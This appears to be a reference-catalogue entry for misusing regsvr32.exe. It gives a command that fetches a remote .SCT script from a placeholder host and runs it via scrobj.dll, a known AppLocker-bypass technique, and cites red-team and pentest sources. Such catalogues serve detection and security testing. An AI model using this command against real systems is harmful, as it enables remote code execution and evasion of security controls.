## Regsvr32.exe
* Functions: Execute
```

regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
Execute the specified remote .SCT script with scrobj.dll.


Execute the specified local .SCT script with scrobj.dll.
```
   
* Resources:   
  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md
  * https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  * https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
   
* Full path:   
  * C:\Windows\System32\regsvr32.exe
  * C:\Windows\SysWOW64\regsvr32.exe
   
* Notes: Thanks to Casey Smith - @subtee  
   
